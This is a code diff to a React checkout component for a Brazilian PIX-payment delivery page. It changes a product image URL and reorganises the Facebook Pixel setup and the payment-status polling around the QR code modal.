@@ -20,7 +20,7 @@ import { createPixPayment } from '../lib/payments-api';
 import { initFacebookPixel, trackEvent, trackPurchase, checkPaymentStatus } from '../lib/facebook-pixel';
 
 // Nova imagem do kit EPI Mercado Livre
-const kitEpiImage = 'https://i.ibb.co/GQJjz9xV/Inserir-um-ti-tulo-1.webp';
+const kitEpiImage = 'https://i.ibb.co/zVWPpfKm/Inserir-um-ti-tulo-1-1.webp';
 import pixLogo from '../assets/pix-logo.png';
 
 // Interface para o endereço do usuário
@@ -66,21 +66,8 @@ const Entrega: React.FC = () => {
   
   // Aplica o scroll para o topo quando o componente é montado
   useScrollTop();
-  
-  // Inicializar o Facebook Pixel
-  useEffect(() => {
-    initFacebookPixel();
-    
-    // Verificar se há um pagamento em andamento
-    const currentPaymentId = localStorage.getItem('current_payment_id');
-    if (currentPaymentId) {
-      console.log('[ENTREGA] Encontrado pagamento em andamento:', currentPaymentId);
-      setTimeout(() => {
-        verificarStatusPagamento(currentPaymentId);
-      }, 3000);
-    }
-  }, []);
-  
+
+  // Inicialize os estados primeiro para evitar erros LSP
   const [endereco, setEndereco] = useState<EnderecoUsuario | null>(null);
   const [dadosUsuario, setDadosUsuario] = useState<DadosUsuario | null>(null);
   const [dataEntrega, setDataEntrega] = useState<string>('');
@@ -92,6 +79,36 @@ const Entrega: React.FC = () => {
   const [showCloseWarning, setShowCloseWarning] = useState(false);
   const [acceptedTerms, setAcceptedTerms] = useState(false);
   const { toast } = useToast();
+  
+  // Inicializar o Facebook Pixel quando o componente montar
+  useEffect(() => {
+    initFacebookPixel();
+    
+    // Limpar ID de pagamento atual ao entrar na página
+    // Isso previne confirmações automáticas de pagamentos anteriores
+    localStorage.removeItem('current_payment_id');
+    console.log('[ENTREGA] Componente montado, limpando pagamentos anteriores');
+  }, []);
+  
+  // Efeito separado para verificar pagamentos quando o modal é aberto e o QR code é gerado
+  useEffect(() => {
+    // Só executa se o modal estiver aberto e o QR code existir
+    if (showPaymentModal && pixInfo) {
+      // Verificar se há um ID de pagamento válido
+      const currentPaymentId = localStorage.getItem('current_payment_id');
+      if (currentPaymentId) {
+        console.log('[ENTREGA] Detectado pagamento em andamento com PIX gerado:', currentPaymentId);
+        
+        // Iniciar verificação após um tempo para permitir o pagamento
+        const timerVerify = setTimeout(() => {
+          verificarStatusPagamento(currentPaymentId);
+        }, 15000);
+        
+        // Limpar o timer quando o componente for desmontado ou estado mudar
+        return () => clearTimeout(timerVerify);
+      }
+    }
+  }, [showPaymentModal, pixInfo]);
 
   // Configuração do formulário
   const { register, handleSubmit, setValue, formState: { errors }, reset } = useForm<EnderecoFormValues>({
